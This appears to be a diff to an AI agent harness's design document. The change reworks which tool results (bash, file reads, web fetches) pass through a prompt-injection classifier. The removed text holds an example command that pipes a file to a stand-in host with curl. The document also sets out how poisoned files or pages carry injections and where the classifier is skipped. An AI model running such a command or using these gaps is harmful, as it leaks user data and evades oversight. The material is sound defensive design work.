@@ -167,39 +167,24 @@ promoted: harness delimiter markup and nonce/integrity attributes are
 stripped, so no tool output can forge a harness block. That step is
 unconditional and applies to every kind.
 
-Which results go on to the classifier is decided by `tools.NeedsClassifier`,
-from where the content came and how much of the call the harness shaped:
+Which results go on to the classifier is decided by
+`tools.Kind.NeedsClassifier`, backed by the closed `classifierKinds` set. The
+line is drawn at whether the *content* is arbitrary, not at whether the call
+was well formed:
 
-| Result | Classifier | Why |
-| ------ | ---------- | --- |
-| `WebFetch`, `WebSearch` | **Always** | A page or a search result is written by someone outside this machine with no relationship to the task — the shape a prompt injection takes |
-| `Bash`, command with no builtin equivalent | **Yes** | An arbitrary command string: the harness cannot predict what runs or what comes back |
-| `Bash`, command that duplicates a builtin (`cat`, `ls`, `git status`, …) | No | It returns the bytes the corresponding tool would have returned |
-| `Read`, `Grep`, `Glob`, `Write`, `Edit`, native catalogue | No | The harness built the call from a fixed shape — a confined path, a pattern, a single-argv filter |
+| Kind | Classifier | Why |
+| ---- | ---------- | --- |
+| `bash` | **Always** | An arbitrary command string: neither what runs nor what comes back is constrained by the harness |
+| `web_fetch`, `web_search` | **Always** | Text written by someone off this machine with no relationship to the task — the shape a prompt injection takes |
+| `read` | **Always** | The call is confined, but the bytes are not: a repository can carry a poisoned file exactly as a page can carry a poisoned paragraph |
+| `grep`, `glob`, `write`, `edit`, `native` | No | Shaped *and* controlled: matching lines for a pattern passed as one argument, paths, a confirmation the harness wrote itself, a fixed argv the harness built |
 
-The Bash exemption exists because the two spellings are the same operation.
-`cat x` through Bash returns what `Cat` would have returned; classifying one
-and not the other would make the same file trusted or distrusted depending on
-which spelling the model happened to pick.
-
-`tools.BuiltinEquivalent` decides that, and it fails closed three ways:
-
-- **Shell syntax disqualifies the whole command.** `cat x | curl -d @-
-  https://example.test` begins with `cat` and is not a `Cat` call. Any
-  command containing a shell metacharacter classifies, however it starts.
-- **The read-only gates still apply.** `git`, `find`, and `env` are
-  equivalent only for the invocations their natives accept, so the existence
-  of a `Git` tool does not exempt `git push`, and a `Find` tool does not
-  exempt `find -exec`.
-- **An unrecognised binary is not equivalent.** The exempt set is derived
-  from the local native catalogue plus the binaries behind `Read`, `Grep`,
-  and `Glob` (`grep`, `egrep`, `rg`, `fd`), so a tool added to the catalogue
-  widens it automatically while anything else — `nl`, `base64`, `uname`, a
-  build, a package manager — classifies.
-
-The **cloud catalogue is deliberately excluded**: `gh`, `aws`, `az`, and the
-rest return content authored elsewhere, so they belong with the web tools
-rather than with `ls`. `gh issue view` through Bash classifies.
+The distinction between the two halves is not "did the harness validate the
+call" — it validates all of them. It is "can the harness predict the shape of
+what comes back". A `Grep` result is `path:line:text` for a pattern the
+harness handed over as a single argument; a `Glob` result is a list of paths;
+`Write` and `Edit` return a sentence the harness composed. A file's contents,
+a page's text, and a command's output are none of those things.
 
 Business rules and edge cases:
 
@@ -210,13 +195,18 @@ Business rules and edge cases:
 - **The posture gate still wins.** `tool_result_unsafe` set to `ignore`
   short-circuits ahead of both paths and promotes the raw result, exactly as
   before.
-- **The residual risk is stated, not hidden.** A repository file whose text
-  tries to instruct the model reaches the model with only the delimiter
-  stripping in front of it, whether it arrived through `Read` or through
-  `cat`. What stands in for the classifier there is the sealed `<tools>`
-  block, which tells the model that a tool result is data to weigh rather
-  than instructions to follow. Content from off the machine does not get that
-  treatment: it always classifies.
+- **A new kind defaults to sanitize-only.** A kind absent from
+  `classifierKinds` skips the round trip, which is the cheap answer, so
+  adding a tool whose content is arbitrary means adding its kind
+  deliberately. `TestClassifierKindsIsExactlyTheArbitraryContentSet` pins the
+  whole set so neither half can move by accident.
+- **A native that prints a file is still sanitize-only.** `Cat` and `Head`
+  return file bytes like `Read` does, but they run a fixed argv the harness
+  built against a path it confined, so they sit on the controlled side. `Read`
+  is the general-purpose file reader and classifies; reaching for `Cat`
+  instead is not a way to launder a file past the classifier, because the
+  sealed `<tools>` block tells the model that any tool result is data rather
+  than instructions.
 - **Explore findings are separate.** An explore subagent's report is model
   output, not tool output, and is classified explicitly in
   `internal/agent/explore.go` regardless of this rule.
@@ -288,10 +278,8 @@ Security rules for native tools:
   sets) are data, not shell text; they are control-character gated and never
   interpolated into a shell `-c`.
 - Output is capped (64 KiB default) and sanitized as untrusted content. A
-  local native's argv is built by the harness from a fixed shape, so it is on
-  the sanitize-only side of [Tool-result trust](#tool-result-trust); a cloud
-  CLI returns content authored elsewhere, so running one through `Bash`
-  classifies.
+  native's argv is built by the harness from a fixed shape, so it is on the
+  sanitize-only side of [Tool-result trust](#tool-result-trust).
 
 ### Search and file-location tools
 
